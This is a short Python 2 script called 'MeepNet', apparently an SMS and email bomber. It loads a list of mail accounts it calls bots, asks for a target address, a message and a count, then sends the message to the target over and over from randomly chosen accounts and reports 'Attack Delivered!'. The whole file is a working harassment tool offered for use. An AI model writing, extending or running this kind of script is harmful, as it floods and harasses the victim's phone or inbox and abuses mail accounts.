## MeepNet ##
import time
import smtplib
import random
print(" \n\r")
print(" /$$      /$$                               /$$   /$$             /$$           /$$    /$$ /$$   /$$")
print("| $$$    /$$$                              | $$$ | $$            | $$          | $$   | $$| $$  | $$")
print("| $$$$  /$$$$  /$$$$$$   /$$$$$$   /$$$$$$ | $$$$| $$  /$$$$$$  /$$$$$$        | $$   | $$| $$  | $$")
print("| $$ $$/$$ $$ /$$__  $$ /$$__  $$ /$$__  $$| $$ $$ $$ /$$__  $$|_  $$_/        |  $$ / $$/| $$$$$$$$")
print("| $$  $$$| $$| $$$$$$$$| $$$$$$$$| $$  \ $$| $$  $$$$| $$$$$$$$  | $$           \  $$ $$/ |_____  $$")
print("| $$\  $ | $$| $$_____/| $$_____/| $$  | $$| $$\  $$$| $$_____/  | $$ /$$        \  $$$/        | $$")
print("| $$ \/  | $$|  $$$$$$$|  $$$$$$$| $$$$$$$/| $$ \  $$|  $$$$$$$  |  $$$$/         \  $/         | $$")
print("|__/     |__/ \_______/ \_______/| $$____/ |__/  \__/ \_______/   \___/            \_/          |__/")
print("                                 | $$                                                               ")
print("                                 | $$                                                               ")
print("                                 |__/                                                               ")
print(" \n\r")
print("                                   Welcome To MeepNet 4.5 \n\r")
print("                                   Developed By EthanMeep \n\r")
print("                                 Attempting To Load Config... \n\r")
#CONFIG LOAD
import config
print("                                 Server Connected At: " + config.server)
print("                                 On Port: " + str(config.port))
print("                                 " + str(len(config.clients)) + " Bots Loaded! \n\r")
#CONFIG LOADED
print("                                 Config Loaded Successfully! \n\r")
print("\n\r")
target = raw_input("                                 Target: ")
msg = raw_input("                                 Message: ")
msg_amount = input("                                 Ammount: ")
print(" \n\r")
for _ in range(0,msg_amount):
#ATTACK START
    LiveClient = random.choice(config.clients)
    server = smtplib.SMTP(config.server, config.port)
    server.starttls()
    server.login(LiveClient, config.clientpass)
    server.sendmail(LiveClient,target,msg)
    server.quit
#ATTACK END
    print("                                 Sent From " + LiveClient)
print(" \n\r")
print("                        Attack Delivered! " + str(msg_amount) + " Texts Sent. \n\r")
